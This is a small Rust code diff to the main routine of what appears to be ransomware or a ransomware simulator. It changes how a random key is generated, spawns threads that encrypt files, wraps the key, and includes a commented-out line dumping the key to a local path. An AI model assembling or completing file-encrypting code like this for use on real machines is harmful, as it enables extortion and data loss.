@@ -53,7 +53,7 @@ async fn main() {
 
     let disable_cryptography = should_disable_crypto();
 
-    let mut key = encryptor::generate_key();
+    let mut key = encryptor::generate_random(32);
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
@@ -72,7 +72,7 @@ async fn main() {
             let thread_reciever = r.clone();
             let thread_key = key.clone();
             threads.push(tokio::spawn(async move {
-                encryptor::encrypt_files(thread_reciever, thread_key).await;
+                encryptor::encrypt_files(thread_reciever, thread_key, true).await;
             }));
         }
 
@@ -82,6 +82,7 @@ async fn main() {
     } else {
         event!(Level::INFO, "-- SKIPPED STAGE: Worker Start --");
     }
+    //let _ = write(PathBuf::from("/home/kobiske/Videos/key.key"), &key);
 
     event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
     let encrypted_key = wrap_key(&key);
